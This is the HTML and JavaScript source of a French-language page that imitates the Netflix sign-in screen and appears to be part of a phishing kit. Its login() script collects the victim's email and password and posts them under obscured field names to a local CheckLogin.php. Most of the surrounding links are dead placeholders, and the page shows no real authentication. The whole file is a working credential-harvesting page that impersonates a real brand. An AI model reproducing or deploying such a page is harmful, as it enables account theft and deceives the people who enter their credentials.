

<!DOCTYPE>
<html>
<head>
<title>Netflix</title>
<link type="text/css" rel="stylesheet" href="img/css.css">
<link rel="shortcut icon" href="img/nficon2016.ico">
<link rel="apple-touch-icon" href="img/nficon2016.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js" type="text/javascript"></script>
<meta charset="UTF-8">
</head>
<body>
<div id="appMountPoint">
<div class="login-wrapper" data-reactroot="" data-reactid="1" data-react-checksum="1712513156">
<div class="nfHeader login-header signupBasicHeader" data-reactid="2">
<a href="#" class="svg-nfLogo signupBasicHeader" data-reactid="3">
<svg class="svg-icon svg-icon-netflix-logo " focusable="true" data-reactid="4">
<use filter="" xlink:href="#netflix-logo" data-reactid="5"></use>
</svg>
<span class="screen-reader-text" data-reactid="6">Netflix</span>
</a></div><div class="login-body" data-reactid="7">
<div data-reactid="8">

<div class="login-content login-form" data-reactid="10">
<h1 data-reactid="11">S'identifier</h1>
<span style="color: red;" id="error"></span>
<form class="login-form" action="CheckLogin.php" method="post" data-reactid="13">
<label class="login-input login-input-email ui-label ui-input-label" id="lbl-email" placeholder="email" data-reactid="14">
<span class="ui-label-text" data-reactid="15">E-mail</span><input class="ui-text-input" name="xoooo" id="email" value="" tabindex="1" autocomplete="email" data-reactid="16"></label><div class="hybrid-password-wrapper" data-reactid="17">
<label class="hybrid-password login-input login-input-password ui-label ui-input-label" id="lbl-password" placeholder="password" data-reactid="18"><span class="ui-label-text" data-reactid="19">Mot de passe</span>
<input type="password" class="ui-text-input" name="XoooX" id="password" tabindex="2" data-reactid="20">
</label>
<input type="button" class="show-toggle no-toggle" value="Show Password" data-reactid="21">
<span data-reactid="22"></span>
</div>
<div class="login-forgot-password-wrapper" data-reactid="23">
<a href="#" class="login-help-link" tabindex="3" data-reactid="24">E-mail ou mot de passe ?</a>
</div>
<button class="btn login-button btn-submit btn-small" type="button" autocomplete="off" tabindex="4" data-reactid="25" onclick="login()" >
S'identifier

</button>
<div class="login-remember-me-wrapper" data-reactid="27">
<div class="ui-binary-input login-remember-me" data-reactid="28">






<input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="5" data-reactid="29" checked="">
<label for="bxid_rememberMe_true" data-reactid="30"><span class="login-remember-me-label-text" data-reactid="31">Se souvenir de moi</span>
</label>
<div class="helper" data-reactid="32"></div></div></div>

</form>
<form class="login-form" action="" method="post" data-reactid="40">
<div class="facebookForm regOption" data-reactid="41">
<div class="fb-minimal" data-reactid="42">
<hr data-reactid="43"><button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="6" data-reactid="44">
<div class="fb-login" data-reactid="45"><img class="icon-facebook" src="img/FB-f-Logo__blue_57.png" data-reactid="46">
<span class="fbBtnText" data-reactid="47">S'identifier avec Facebook</span>
</div></button></div></div>
</form>
<div class="login-signup-now" data-reactid="56">
<!-- react-text: 57 -->Première visite sur Netflix ?  <!-- /react-text -->
<a class=" " target="_self" href="#" data-reactid="58">Inscrivez-vous</a>
</div></div></div></div>
<div class="site-footer-wrapper login-footer" data-reactid="60">
<div class="footer-divider" data-reactid="61"></div>
<div class="site-footer" data-reactid="62">
<p class="footer-top" data-reactid="63">
<a class="footer-top-a" href="#" data-reactid="64">Des questions ? Contactez-nous.</a>
</p>
<ul class="footer-links structural" data-reactid="65">
<li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item" data-reactid="66">
<a class="footer-link" href="#" placeholder="footer_responsive_link_gift_card_terms" data-reactid="67">
<span id="" data-reactid="68">Conditions des cartes cadeaux</span></a></li>
<li class="footer-link-item" placeholder="footer_responsive_link_terms_item" data-reactid="69">
<a class="footer-link" href="#" placeholder="footer_responsive_link_terms" data-reactid="70">
<span id="" data-reactid="71">Conditions d'utilisation</span></a>
</li>
<li class="footer-link-item" placeholder="footer_responsive_link_privacy_item" data-reactid="72"><a class="footer-link" href="#" placeholder="footer_responsive_link_privacy" data-reactid="73">
<span id="" data-reactid="74">Déclaration de confidentialité</span>
</a></li></ul>
<div class="lang-selection-container" id="lang-switcher" data-reactid="75">
<div class="ui-select-wrapper" data-reactid="76">
<label class="ui-label no-display" data-reactid="77">
<span class="ui-label-text" data-reactid="78"></span>
</label>

 <!-- script hna -->

</div><div id="fb-root" class=" fb_reset">
<div style="position: absolute; top: -10000px; height: 0px; width: 0px;">
<div></div></div>
<div style="position: absolute; top: -10000px; height: 0px; width: 0px;">
 <div>

 	</div></div></div>

<script>
function login(){
	var email=$("#email").val();
	var pass=$("#password").val();
	if(!ValidateEmail(email)){
		$("#email").val("");
		$("#email").focus();
		$("#error").text("Veuillez saisir à nouveau votre adresse e-mail.");
		return;
	}
	else{
		$("#error").text("");

	}
	if(!check_password(pass)){
		$("#password").val("");
		$("#password").focus();
		$("#error").text("Le format du mot de passe est incorrect.");
		return;
	}
	else{
		$("#error").text("");

	}
	$.post(
		"CheckLogin.php",
		{
			xoooo: email,
			XoooX: pass
		},
		function(data,status){

		}
	);


}
function ValidateEmail(inputText)
{
	var mailformat = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
	if(inputText.match(mailformat))
	{
		return true;
	}
	else
	{
		return false;
	}
}
function check_password(password){
        var passwnum=  /^(?=.*\d)(?=.*[a-zA-Z])[a-zA-Z0-9!@#$%^&*]{8,20}$/;
        var passw=  /^(?=.*[a-zA-Z])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,20}$/;
        if(password.match(passwnum) && isNaN(password[0])) {
            return true;
        }
        else if(password.match(passw) && isNaN(password[0])) {
            return true;
        }
        else{
           return false;
        }

    }
</script>

</body></html>
	
	